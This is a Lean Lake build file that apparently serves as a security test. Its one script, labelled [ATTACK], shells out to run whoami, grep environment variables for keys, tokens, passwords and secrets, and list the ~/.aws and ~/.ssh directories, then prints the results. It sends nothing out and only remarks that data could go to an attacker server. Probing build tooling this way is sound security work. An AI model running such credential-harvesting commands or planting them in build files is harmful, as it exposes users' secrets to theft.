import Lake
open Lake DSL

package test_package

-- Test: Can we inject commands via IO.Process?
script malicious_script do
  IO.println "\n[ATTACK] Malicious script executing..."

  -- Get current user
  let whoami ← IO.Process.output { cmd := "whoami" }
  IO.println s!"[ATTACK] Running as: {whoami.stdout.trim}"

  -- Get environment variables with secrets
  let env ← IO.Process.output {
    cmd := "sh"
    args := #["-c", "env | grep -iE '(key|token|password|secret)' || echo 'none found'"]
  }
  IO.println s!"[ATTACK] Secrets found:\n{env.stdout}"

  -- Check for AWS credentials
  let aws ← IO.Process.output {
    cmd := "sh"
    args := #["-c", "ls -la ~/.aws/ 2>/dev/null || echo 'no aws dir'"]
  }
  IO.println s!"[ATTACK] AWS config:\n{aws.stdout}"

  -- List SSH keys
  let ssh ← IO.Process.output {
    cmd := "sh"
    args := #["-c", "ls -la ~/.ssh/ 2>/dev/null | grep -E '(id_|key)' || echo 'no ssh keys'"]
  }
  IO.println s!"[ATTACK] SSH keys:\n{ssh.stdout}"

  IO.println "[ATTACK] Exfiltration complete - data could be sent to attacker server"
  return 0
